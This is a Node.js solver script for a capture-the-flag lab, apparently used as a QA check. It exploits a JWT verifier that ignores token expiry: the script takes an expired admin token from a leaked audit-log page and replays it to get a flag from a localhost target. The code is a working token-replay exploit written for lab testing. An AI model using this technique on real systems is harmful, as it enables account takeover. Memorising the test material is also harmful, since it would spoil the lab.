#!/usr/bin/env node
/*
 * VLH-CTF QA solver — DSLTV JWT/exp-not-checked (ExpNotChecked, state variant).
 *
 * Intended path: log in as a tester (sanity — fresh tokens carry role=tester,
 * useless for the gate) → discover the innocent account via /api/directory →
 * pull the innocent's pre-migration token from the security audit log at
 * GET /leaked-tokens (expired 30 days ago, role=admin, "logged out" since —
 * but logout only cleared the cookie) → REPLAY it at GET /flag/jwt. The
 * verifier (vuln.js) verifies with ignoreExpiration and revokes nothing, and
 * the gate accepts the pre-migration iat (iat < migration timestamp).
 *
 * Env: LAB (default http://localhost:8119). Vhosts via the Host header.
 * Node 20+ built-ins only. Exit 0 only on a /DSLTV\{JWT-ExpNotChecked-\d+\}/ flag.
 */
import http from 'node:http';

const LAB = process.env.LAB || process.env.LAB_URL || 'http://localhost:8119';
const BASE = new URL(LAB);
const HOSTNAME = BASE.hostname;
const PORT = Number(BASE.port || 80);
const VICTIM = `victim.target.lab:${PORT}`;
const FLAG_RE = /^DSLTV\{JWT-ExpNotChecked-\d+\}$/;
const PROFILE = 'dsltv-jwt-exp-not-checked';
const TOKEN_RE = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/;

const step = (m) => console.log(`[*] ${m}`);
const ok = (m) => console.log(`[+] ${m}`);
const fail = (m) => { console.error(`[-] ${m}`); process.exit(1); };

function request(method, path, { vhost = VICTIM, body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const payload = body === undefined ? null : (typeof body === 'string' ? body : JSON.stringify(body));
    const h = { host: vhost, ...headers };
    if (payload !== null && !h['content-type']) h['content-type'] = 'application/json';
    const req = http.request({ hostname: HOSTNAME, port: PORT, path, method, headers: h }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => resolve({ status: res.statusCode, text: Buffer.concat(chunks).toString('utf8') }));
    });
    req.setTimeout(5000, () => req.destroy(new Error(`request timeout: ${method} ${path}`)));
    req.on('error', reject);
    if (payload !== null) req.write(payload);
    req.end();
  });
}

const asJson = (r) => { try { return JSON.parse(r.text); } catch (_) { return null; } };
const dec = (s) => JSON.parse(Buffer.from(String(s), 'base64url').toString('utf8'));

async function main() {
  step(`target ${LAB} (Host: ${VICTIM}) — profile ${PROFILE}`);

  /* 1. log in as the known tester (sanity — shows the normal token flow) */
  const lr = await request('POST', '/login', { body: { username: '0xnhsec', password: 'vlh-tester-01' } });
  const lj = asJson(lr);
  if (lr.status !== 200 || !lj || !lj.token) fail(`tester login failed: HTTP ${lr.status} ${lr.text.slice(0, 200)}`);
  ok('logged in as 0xnhsec — fresh tokens carry role=tester (useless for the gate)');

  /* 2. discover the innocent identity via the legit leak endpoint */
  const dr = await request('GET', '/api/directory');
  const dj = asJson(dr);
  const innocent = dj && dj.users ? dj.users.find((u) => u.role === 'innocent') : null;
  if (!innocent) fail(`innocent not found in /api/directory: HTTP ${dr.status} ${dr.text.slice(0, 200)}`);
  ok(`innocent identity discovered: ${innocent.username}`);

  /* 3. pull the innocent's retained pre-migration token from the audit log */
  const ar = await request('GET', '/leaked-tokens');
  if (ar.status !== 200) fail(`cannot read /leaked-tokens: HTTP ${ar.status} ${ar.text.slice(0, 200)}`);
  const m = TOKEN_RE.exec(ar.text);
  if (!m) fail('no JWT found in the audit-log page');
  const leaked = m[0];
  const payload = dec(leaked.split('.')[1]);
  if (payload.sub !== innocent.username) fail(`leaked token is not the innocent's: sub=${payload.sub}`);
  if (payload.role !== 'admin') fail(`leaked token does not carry the admin claim: ${JSON.stringify(payload)}`);
  ok(`recovered expired token (sub=${payload.sub}, role=${payload.role}, iat=${payload.iat}, exp=${payload.exp}) — long past expiry`);

  /* 4. replay it — the verifier ignores exp and logout revoked nothing */
  const fr = await request('GET', '/flag/jwt', { headers: { authorization: `Bearer ${leaked}` } });
  const fj = asJson(fr);
  if (fr.status === 200 && fj && fj.flag && FLAG_RE.test(fj.flag)) {
    ok(`FLAG ${fj.flag}`);
    process.exit(0);
  }
  fail(`/flag/jwt rejected the replayed token: HTTP ${fr.status} ${fr.text.slice(0, 300)}`);
}

main().catch((e) => {
  if (e && (e.code === 'ECONNREFUSED' || e.code === 'ENOTFOUND' || e.code === 'EHOSTUNREACH')) {
    fail(`lab not running (${e.code} on ${LAB}) — start it: docker compose --profile ${PROFILE} up -d`);
  }
  fail(e && e.stack ? e.stack : String(e));
});
